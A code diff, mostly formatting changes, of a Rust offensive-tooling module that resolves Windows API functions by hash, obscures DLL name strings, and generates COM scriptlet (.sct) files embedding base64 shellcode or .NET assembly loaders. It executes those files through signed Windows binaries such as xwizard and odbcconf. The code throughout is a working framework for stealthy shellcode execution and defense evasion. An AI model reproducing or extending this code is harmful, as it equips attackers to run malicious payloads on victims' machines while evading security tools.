@@ -45,15 +45,15 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
+use crate::win_types::HANDLE as NT_HANDLE;
+use crate::win_types::LARGE_INTEGER;
 use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
 use crate::win_types::{HANDLE, LPCWSTR, NTSTATUS, PCWSTR};
 use crate::win_types::{SIZE_T, ULONG_PTR};
 use windows_sys::Win32::Security::ACCESS_MASK;
-use crate::win_types::HANDLE as NT_HANDLE;
-use crate::win_types::LARGE_INTEGER;
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
@@ -116,8 +116,8 @@ const TEMP_SUFFIX_LEN: usize = 8;
 
 // kernel32.dll
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);
 
@@ -137,8 +137,8 @@ const HASH_FINDCLOSE: u32 = hash_str_const(b"FindClose\0");
 
 // ntdll.dll
 const NTDLL_DLL_W: &[u16] = &[
-    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16,
-    'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
 ];
 const HASH_NTDLL_DLL: u32 = hash_wstr_const(NTDLL_DLL_W);
 
@@ -167,23 +167,11 @@ type FnCreateProcessW = unsafe extern "system" fn(
 type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;
 type FnGetLastError = unsafe extern "system" fn() -> u32;
 
-type FnCreateFileW = unsafe extern "system" fn(
-    LPCWSTR,
-    DWORD,
-    DWORD,
-    *mut c_void,
-    DWORD,
-    DWORD,
-    HANDLE,
-) -> HANDLE;
+type FnCreateFileW =
+    unsafe extern "system" fn(LPCWSTR, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE) -> HANDLE;
 
-type FnWriteFile = unsafe extern "system" fn(
-    HANDLE,
-    *const c_void,
-    DWORD,
-    *mut DWORD,
-    *mut c_void,
-) -> BOOL;
+type FnWriteFile =
+    unsafe extern "system" fn(HANDLE, *const c_void, DWORD, *mut DWORD, *mut c_void) -> BOOL;
 
 type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
 type FnGetTempPathW = unsafe extern "system" fn(DWORD, *mut u16) -> DWORD;
@@ -258,7 +246,10 @@ unsafe fn resolve_ntdll<T>(fn_hash: u32) -> Result<T> {
 
 /// Convert a Rust string to a null-terminated wide (UTF-16) vector.
 fn to_wide(s: &str) -> Vec<u16> {
-    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
+    OsStr::new(s)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect()
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -398,9 +389,7 @@ impl ComScriptletGen {
     /// The complete XML scriptlet content as a UTF-8 string.
     pub fn generate_scriptlet_sct(shellcode: &[u8], config: &ScriptletConfig) -> String {
         let shellcode_b64 = base64_encode(shellcode);
-        let payload = PayloadType::ShellcodeExec {
-            shellcode_b64,
-        };
+        let payload = PayloadType::ShellcodeExec { shellcode_b64 };
         Self::generate_inline_sct_payload(&payload, config)
     }
 
@@ -409,14 +398,8 @@ impl ComScriptletGen {
     /// Creates a complete .sct file with the appropriate JScript/VBScript
     /// inline code for the given payload type.
     pub fn generate_inline_sct_payload(payload: &PayloadType, config: &ScriptletConfig) -> String {
-        let class_name = config
-            .class_name
-            .as_deref()
-            .unwrap_or("XWzrdHelper");
-        let prog_id = config
-            .prog_id
-            .as_deref()
-            .unwrap_or("XWzrd.Helper.1");
+        let class_name = config.class_name.as_deref().unwrap_or("XWzrdHelper");
+        let prog_id = config.prog_id.as_deref().unwrap_or("XWzrd.Helper.1");
         let clsid = config
             .clsid
             .as_deref()
@@ -662,10 +645,7 @@ RegisterSvr();"#,
                     ext = ext,
                 )
             }
-            PayloadType::AssemblyLoad {
-                assembly_b64,
-                ..
-            } => {
+            PayloadType::AssemblyLoad { assembly_b64, .. } => {
                 format!(
                     r#"
     Dim asm
@@ -772,18 +752,27 @@ impl XwizardExecution {
     /// # Arguments
     /// * `scriptlet_content` - The XML scriptlet content (UTF-8).
     /// * `wait` - Whether to wait for the process to complete.
-    pub fn execute_via_xwizard_temp(scriptlet_content: &str, wait: bool) -> Result<ExecutionResult> {
+    pub fn execute_via_xwizard_temp(
+        scriptlet_content: &str,
+        wait: bool,
+    ) -> Result<ExecutionResult> {
         // Write scriptlet to a temp file.
         let temp_path = unsafe { write_temp_scriptlet(scriptlet_content.as_bytes(), "sct")? };
         let temp_path_str = String::from_utf16_lossy(
-            &temp_path.iter().take_while(|&&c| c != 0).copied().collect::<Vec<u16>>(),
+            &temp_path
+                .iter()
+                .take_while(|&&c| c != 0)
+                .copied()
+                .collect::<Vec<u16>>(),
         );
 
         let result = Self::execute_via_xwizard(&temp_path_str, wait);
 
         // Clean up temp file even if execution failed.
         if result.is_err() {
-            unsafe { delete_file_best_effort(&temp_path); }
+            unsafe {
+                delete_file_best_effort(&temp_path);
+            }
         }
 
         result
@@ -852,11 +841,7 @@ impl XwizardExecution {
             }
 
             // Copy the scriptlet content into the mapped view.
-            ptr::copy_nonoverlapping(
-                content_bytes.as_ptr(),
-                base_addr as *mut u8,
-                content_len,
-            );
+            ptr::copy_nonoverlapping(content_bytes.as_ptr(), base_addr as *mut u8, content_len);
 
             debug!(
                 "lolbin_xwizard: mapped scriptlet at {:p}, {} bytes",
@@ -894,10 +879,7 @@ impl LolbinDispatcher {
     /// via the REGSVR action, which also accepts .sct files.
     pub fn execute_via_odbcconf(scriptlet_path: &str, wait: bool) -> Result<ExecutionResult> {
         let odbcconf_path = r"C:\Windows\System32\odbcconf.exe";
-        let cmd_line = format!(
-            r#"odbcconf.exe /A {{REGSVR "{}"}}"#,
-            scriptlet_path
-        );
+        let cmd_line = format!(r#"odbcconf.exe /A {{REGSVR "{}"}}"#, scriptlet_path);
 
         let cmd_wide = to_wide(&cmd_line);
         let exe_wide = to_wide(odbcconf_path);
@@ -1075,8 +1057,7 @@ unsafe fn spawn_process(exe_wide: &[u16], cmd_wide: &[u16], wait: bool) -> Resul
     close_handle(proc_info.h_thread);
 
     if wait {
-        let wait_fn: FnWaitForSingleObject =
-            unsafe { resolve_kernel32(HASH_WAITFORSINGLEOBJECT)? };
+        let wait_fn: FnWaitForSingleObject = unsafe { resolve_kernel32(HASH_WAITFORSINGLEOBJECT)? };
         wait_fn(proc_info.h_process, INFINITE);
         close_handle(proc_info.h_process);
     } else {
@@ -1202,7 +1183,11 @@ fn file_exists_on_disk(path: &str) -> bool {
 fn random_hex_string(len: usize) -> String {
     // Simple LCG PRNG seeded from a stack address (ASLR provides randomness).
     let seed_ptr = &len as *const usize;
-    let mut state = unsafe { (seed_ptr as usize).wrapping_mul(1103515245).wrapping_add(12345) };
+    let mut state = unsafe {
+        (seed_ptr as usize)
+            .wrapping_mul(1103515245)
+            .wrapping_add(12345)
+    };
 
     let hex_chars = b"0123456789abcdef";
     let mut result = String::with_capacity(len);
@@ -1218,8 +1203,7 @@ fn random_hex_string(len: usize) -> String {
 ///
 /// We implement this inline to avoid depending on the `base64` crate.
 fn base64_encode(data: &[u8]) -> String {
-    const ALPHABET: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
     let mut result = String::with_capacity((data.len() + 2) / 3 * 4);
     let chunks = data.chunks(3);
@@ -1503,7 +1487,10 @@ mod tests {
     #[test]
     fn test_to_wide_basic() {
         let wide = to_wide("test");
-        assert_eq!(wide, &[b't' as u16, b'e' as u16, b's' as u16, b't' as u16, 0]);
+        assert_eq!(
+            wide,
+            &[b't' as u16, b'e' as u16, b's' as u16, b't' as u16, 0]
+        );
     }
 
     #[test]
@@ -1574,10 +1561,7 @@ mod tests {
         // Verify the odbcconf command format is correct.
         // We can't actually execute it in tests, but we can verify the pattern.
         let scriptlet_path = r"C:\Temp\payload.sct";
-        let expected = format!(
-            r#"odbcconf.exe /A {{REGSVR "{}"}}"#,
-            scriptlet_path
-        );
+        let expected = format!(r#"odbcconf.exe /A {{REGSVR "{}"}}"#, scriptlet_path);
         assert!(expected.contains("/A"));
         assert!(expected.contains("REGSVR"));
         assert!(expected.contains(scriptlet_path));
